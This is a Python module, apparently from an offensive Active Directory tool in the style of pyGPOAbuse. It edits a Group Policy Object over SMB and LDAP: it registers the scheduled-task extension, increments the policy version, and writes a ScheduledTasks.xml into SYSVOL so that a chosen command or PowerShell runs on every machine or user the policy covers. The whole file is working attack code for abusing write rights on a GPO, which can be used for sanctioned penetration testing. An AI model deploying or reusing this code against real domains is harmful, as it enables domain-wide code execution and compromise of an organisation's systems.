import asyncio
import logging
import re
from pygpobtuse.scheduledtask import ScheduledTask
from pygpobtuse.ldap import Ldap


class GPO:
    def __init__(self, smb_session):
        self._smb_session = smb_session

    def update_extensionNames(self, extensionName):
        val1 = "00000000-0000-0000-0000-000000000000"
        val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
        val3 = "AADCED64-746C-4633-A97C-D61349046527"

        if extensionName is None:
            extensionName = ""

        try:
            if not val2 in extensionName:
                new_values = []
                toUpdate = ''.join(extensionName)
                test = toUpdate.split("[")
                for i in test:
                    new_values.append(i.replace("{", "").replace("}", " ").replace("]", ""))

                if val1 not in toUpdate:
                    new_values.append(val1 + " " + val2)

                elif val1 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val1 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                if val3 not in toUpdate:
                    new_values.append(val3 + " " + val2)

                elif val3 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val3 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                new_values.sort()

                new_values2 = []
                for i in range(len(new_values)):
                    if new_values[i] is None or new_values[i] == "":
                        continue
                    value1 = new_values[i].split()
                    new_val = ""
                    for q in range(len(value1)):
                        if value1[q] is None or value1[q] == "":
                            continue
                        new_val += "{" + value1[q] + "}"
                    new_val = "[" + new_val + "]"
                    new_values2.append(new_val)

                return "".join(new_values2)
        except:
            return "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]"

    async def update_ldap(self, url, domain, gpo_id, gpo_type="computer"):
        ldap = Ldap(url, gpo_id, domain)
        r = await ldap.connect()
        if not r:
            logging.debug("Could not connect to LDAP")
            return False

        version = await ldap.get_attribute("versionNumber")
        logging.debug("Current version number : {}".format(version))
        # update versions in line with 
        # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpol/70fd86b1-926a-4dcf-9ce7-6f9d2149c20d

        user_version = version >> 16
        machine_version = version & 0xFFFF 

        if gpo_type == "computer":
            attribute_name = "gPCMachineExtensionNames"
            machine_version = (machine_version + 1) & 0xFFFF
            machine_version = 1 if machine_version == 0 else machine_version
        else:
            attribute_name = "gPCUserExtensionNames"
            user_version = (user_version + 1) & 0xFFFF
            user_version = 1 if user_version == 0 else user_version


        updated_version = (user_version << 16) + machine_version

        extensionName = await ldap.get_attribute(attribute_name)

        if extensionName == False:
            logging.debug("Could not get {} attribute".format(attribute_name))
            return False

        updated_extensionName = self.update_extensionNames(extensionName)

        logging.debug("New extensionName: {}".format(updated_extensionName))

        await ldap.update_attribute(attribute_name, updated_extensionName, extensionName)
        await ldap.update_attribute("versionNumber", updated_version, version)

        return updated_version

    def update_versions(self, url, domain, gpo_id, gpo_type, samaccount, user_sid, task_version, archivo):
        updated_version = asyncio.run(self.update_ldap(url, domain, gpo_id, gpo_type))
        if not updated_version:
            return False

        logging.debug("Updated version number : {}".format(updated_version))

        try:
            tid = self._smb_session.connectTree("SYSVOL")
            fid = self._smb_session.openFile(tid, domain + "/Policies/{" + gpo_id + "}/gpt.ini")
            content = self._smb_session.readFile(tid, fid)
             # Added by @Deft_ to comply with french active directories (mostly accents)
            try:
                new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("utf-8"))
            except UnicodeDecodeError:
                new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("latin-1"))
            self._smb_session.writeFile(tid, fid, new_content)
            self._smb_session.closeFile(tid, fid)
        except:
            logging.error("Unable to update gpt.ini file", exc_info=True)
            return False

        logging.debug("gpt.ini file successfully updated")
        return True

    def _check_or_create(self, base_path, path):
        for dir in path.split("/"):
            base_path += dir + "/"
            try:
                self._smb_session.listPath("SYSVOL", base_path)
                logging.debug("{} exists".format(base_path))
            except:
                try:
                    self._smb_session.createDirectory("SYSVOL", base_path)
                    logging.debug("{} created".format(base_path))
                except:
                    logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                    return False
        return True

    def update_scheduled_task(self, domain, gpo_id, name="", mod_date="", description="", powershell=False, command="", gpo_type="computer", force=False,replace=False,filter_gpo=False, samaccount=None, user_sid=None, task_version="1.3", archivo="NOT_NEEDING"):
        try:
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL")
        except:
            logging.error("Unable to connect to SYSVOL share", exc_info=True)
            return False

        path = domain + "/Policies/{" + gpo_id + "}/"

        try:
            self._smb_session.listPath("SYSVOL", path)
            logging.debug("GPO id {} exists".format(gpo_id))
        except:
            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
            return False

        if gpo_type == "computer":
            root_path = "Machine"
        else:
            root_path = "User"

        if not self._check_or_create(path, "{}/Preferences/ScheduledTasks".format(root_path)):
            return False

        path += "{}/Preferences/ScheduledTasks/ScheduledTasks.xml".format(root_path)

        try:
            fid = self._smb_session.openFile(tid, path)
            st_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
            if replace:
                st_content = ""
            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description, powershell=powershell, command=command, old_value=st_content, filter_gpo=filter_gpo, samaccount=samaccount, user_sid=user_sid, task_version=task_version,archivo=archivo)
            tasks = st.parse_tasks(st_content)

            if not force or replace:
                logging.error("The GPO already includes a ScheduledTasks.xml.")
                logging.error("Use -f to append to ScheduledTasks.xml")
                logging.error("Use -r to replace ScheduledTasks.xml")
                logging.error("Use -v to display existing tasks")
                logging.warning("C: Create, U: Update, D: Delete, R: Replace")
                for task in tasks:
                    logging.warning("[{}] {} (Type: {})".format(task[0], task[1], task[2]))
                return False
           
            new_content = st.generate_scheduled_task_xml()
        except Exception as e:
            # File does not exist
            logging.debug("ScheduledTasks.xml does not exist. Creating it...")
            try:
                fid = self._smb_session.createFile(tid, path)
                logging.debug("ScheduledTasks.xml created")
            except:
                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                return False
            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description, powershell=powershell, command=command, old_value="", filter_gpo=filter_gpo, samaccount=samaccount, user_sid=user_sid, task_version=task_version,archivo=archivo)
            new_content = st.generate_scheduled_task_xml()

        try:
            self._smb_session.writeFile(tid, fid, new_content)
            logging.debug("ScheduledTasks.xml has been saved")
        except:
            logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
            self._smb_session.closeFile(tid, fid)
            return False
        self._smb_session.closeFile(tid, fid)
        return st.get_name()
